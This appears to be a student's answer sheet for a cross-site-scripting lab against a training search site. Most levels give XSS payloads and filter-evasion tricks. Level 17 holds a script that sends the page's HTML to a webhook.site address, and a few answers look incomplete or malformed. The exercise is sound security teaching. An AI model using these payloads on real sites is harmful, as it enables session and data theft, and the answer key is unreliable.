# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)


TODO:``` (<script>success()</script>)``` 

  
# 2. No Script Allowed (3 points)


TODO:```</script><script>success()</script>``` 


# 3. One More Time, Like You Mean It (3 points)


TODO: ``` <img src onerror="alert('You are Rashad:D')"> or``` 

# 4. An Open-and-Shut Case (3 points)


TODO:```  <ScRiPt>success()</sCriPt>``` 

# 5. Time to Mix Things Up (3 points)


TODO: ``` <ScRiPt>success()</sCriPt>``` 

# 6. A Picture is Worth a Thousand Words (3 points)

 
TODO: ```<image src =q onerror=success()>``` 
 
# 7. Between a Rock And a Hard Place (3 points)


TODO:``` <iframe src=# onmouseover="success(document.cookie)"></iframe> or <button onClick="success()">Göndər</button>``` 

# 8. Angle of Death (6 points)

Attack input:


TODO:```  <<script>>success()</script> ``` 


Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)


TODO: ``` <iframe"<svg onload=alert()>"> or``` 


# 11. You Can't Win 'em All (6 points)

Attack input:


TODO: ``` "" false = "success ()"``` 


Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 12. When All is Said and Done (6 points)

Attack input:


TODO: ``` '><script>alert();</script> or ``` 

Server code:

js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
  // q = ???

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})


# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:


TODO: ```" onload=alert(1) --- http://caloogle.xyz:4140/search?q=bdhehegdhg&lang=en%20onload=success()``` 

# 15. The Early Bird Catches the Worm (3 points)


TODO: ``` </script> <img src=/ onerror=success() /> <script>``` 
  
# 16. Tying Up Loose Ends (3 points)


TODO: ``` <<<///scrip<<//script>>t>>><img src =q onerror=success()>``` 

# 17. Take a Page Out of Their Book (6 points)

Attack code:

js
// TODO:```  function send(payload) {
    fetch('/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({text: 'http://google.com/', id: "1);success("})
    }).then((response) => response.clone().text())
    .then((data) => console.log(data));
}
send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')``` 

# 18. Congrats

N/A

# Əlavə qeydlər


Əlavə qeydlərinizi yazın